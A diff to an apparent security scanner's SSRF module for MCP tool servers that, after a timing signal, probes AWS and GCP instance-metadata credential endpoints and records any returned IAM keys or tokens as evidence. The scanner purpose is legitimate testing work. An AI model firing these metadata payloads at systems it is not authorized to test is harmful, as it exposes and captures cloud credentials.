@@ -135,29 +135,40 @@ class SSRFModule(ScanModule):
                         if elapsed >= _MIN_TIMEOUT_SIGNAL and (
                             baseline_elapsed is None or elapsed > baseline_elapsed * _TIMEOUT_FACTOR
                         ):
-                            findings.append(Finding(
-                                owasp_category=OWASPCategory.EXT04_SSRF,
-                                severity=Severity.HIGH,
-                                title=f"SSRF (timing) — '{tool.name}.{param}' delayed on SSRF payload",
-                                description=(
-                                    f"Call with payload '{payload}' took {elapsed:.1f}s "
-                                    + (f"vs baseline {baseline_elapsed:.1f}s" if baseline_elapsed else "(no baseline)")
-                                    + " — server likely attempted the outbound request before timing out."
-                                ),
-                                tool_name=tool.name,
-                                parameter=param,
-                                payload=payload,
-                                confidence=70,
-                                remediation=(
-                                    "Block outbound requests to RFC-1918 and link-local ranges. "
-                                    "Use an allowlist for permitted URL schemes and hosts."
-                                ),
-                            ))
+                            # Attempt IMDS IAM chain to escalate to CRITICAL
+                            chain = await _probe_imds_chain(
+                                transport, tool.name, param, self.engine, properties, required
+                            )
+                            if chain:
+                                findings.append(chain)
+                            else:
+                                findings.append(Finding(
+                                    owasp_category=OWASPCategory.EXT04_SSRF,
+                                    severity=Severity.HIGH,
+                                    title=f"SSRF (timing) — '{tool.name}.{param}' delayed on SSRF payload",
+                                    description=(
+                                        f"Call with payload '{payload}' took {elapsed:.1f}s "
+                                        + (f"vs baseline {baseline_elapsed:.1f}s" if baseline_elapsed else "(no baseline)")
+                                        + " — server likely attempted the outbound request before timing out."
+                                    ),
+                                    tool_name=tool.name,
+                                    parameter=param,
+                                    payload=payload,
+                                    confidence=70,
+                                    remediation=(
+                                        "Block outbound requests to RFC-1918 and link-local ranges. "
+                                        "Use an allowlist for permitted URL schemes and hosts."
+                                    ),
+                                ))
                             break
 
                     except asyncio.TimeoutError:
                         elapsed = time.monotonic() - t0
-                        findings.append(Finding(
+                        # Attempt IMDS IAM chain to escalate to CRITICAL
+                        chain = await _probe_imds_chain(
+                            transport, tool.name, param, self.engine, properties, required
+                        )
+                        findings.append(chain or Finding(
                             owasp_category=OWASPCategory.EXT04_SSRF,
                             severity=Severity.HIGH,
                             title=f"SSRF (timeout) — '{tool.name}.{param}' hung on SSRF payload",
@@ -179,6 +190,59 @@ class SSRFModule(ScanModule):
                         pass
 
         return findings
+
+
+_IMDS_IAM_PAYLOADS = [
+    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",  # AWS role list
+    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",  # GCP token
+]
+
+_IAM_SIGNATURES = ["AccessKeyId", "SecretAccessKey", "Token", "access_token", "expires_in"]
+
+
+async def _probe_imds_chain(
+    transport: MCPTransport,
+    tool_name: str,
+    param: str,
+    engine: PayloadEngine,
+    properties: dict[str, Any],
+    required: list[str],
+) -> Finding | None:
+    """After a timing SSRF signal, attempt targeted IAM credential endpoints.
+
+    Returns a CRITICAL Finding if credentials are confirmed, else None.
+    """
+    for iam_payload in _IMDS_IAM_PAYLOADS:
+        args = engine.build_args(properties, required, param, iam_payload)
+        try:
+            result = await asyncio.wait_for(
+                transport.send_request("tools/call", {"name": tool_name, "arguments": args}),
+                timeout=3.0,
+            )
+            text = _extract_text(result)
+            if any(sig in text for sig in _IAM_SIGNATURES):
+                return Finding(
+                    owasp_category=OWASPCategory.EXT04_SSRF,
+                    severity=Severity.CRITICAL,
+                    title=f"SSRF + IMDS chain — '{tool_name}.{param}' returned cloud credentials",
+                    description=(
+                        f"Timing signal confirmed SSRF; follow-up request to '{iam_payload}' "
+                        f"returned cloud IAM credential content, confirming full metadata access."
+                    ),
+                    tool_name=tool_name,
+                    parameter=param,
+                    payload=iam_payload,
+                    evidence=text[:400],
+                    exploitation_confirmed=True,
+                    confidence=95,
+                    remediation=(
+                        "Block outbound requests to RFC-1918 and link-local ranges. "
+                        "Use an allowlist for permitted URL schemes and hosts."
+                    ),
+                )
+        except Exception:
+            pass
+    return None
 
 
 async def _benign_elapsed(
